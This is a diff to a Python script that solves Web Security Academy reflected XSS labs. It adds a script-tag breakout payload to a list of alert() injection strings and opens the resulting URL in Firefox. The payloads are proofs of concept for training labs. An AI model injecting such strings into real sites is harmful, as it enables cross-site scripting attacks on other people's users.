@@ -3,6 +3,7 @@
 import requests
 import urllib3
 import argparse
+import subprocess
 from argparse import RawTextHelpFormatter
 
 # Disable warnings related to certificates
@@ -19,9 +20,11 @@ Example usage without proxy: python3 script.py -u "https://0a4b003803f44a75c13da
 2. Reflected XSS into attribute with angle brackets HTML-encoded, solution: " autofocus onfocus=alert('XSS') x="
 
 3. Reflected XSS into a JavaScript string with angle brackets HTML encoded, solution: ';-alert('XSS')-' or ';alert('XSS')//
+
+4. Reflected XSS into a JavaScript string with single quote and backslash escaped, solution: </script><script>alert(1)</script>
 """, usage='use "python3 %(prog)s --help" for more information', formatter_class=RawTextHelpFormatter)
 parser.add_argument('-u', '--url', help='URL, Example: https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net', required=True)
-parser.add_argument('-c', '--command', help='Command to run, Example: <script>alert(\'XSS\')</script>, \" autofocus onfocus=alert(\'XSS\') x=\", \';-alert(\'XSS\')-\'', required=True)
+parser.add_argument('-c', '--command', help='Command to run, Example: <script>alert(\'XSS\')</script>, \" autofocus onfocus=alert(\'XSS\') x=\", \';-alert(\'XSS\')-\', </script><script>alert(1)</script>', required=True)
 parser.add_argument('-p', '--proxy', help='Proxy, Example: 127.0.0.1:8080', required=False)
 args = parser.parse_args()
 
@@ -47,7 +50,9 @@ def xss(url, command):
         r = requests.get(url, params=params, verify=False)
         # verify the response contains Congratulations, you solved the lab!
         if (b'Congratulations, you solved the lab!' in r.content):
+            path = url + '/?search=' + command
             print("(+) Reflected XSS Successful!")
+            subprocess.call(["firefox", path])
         else:
             print("(-) Reflected XSS Failed")
 
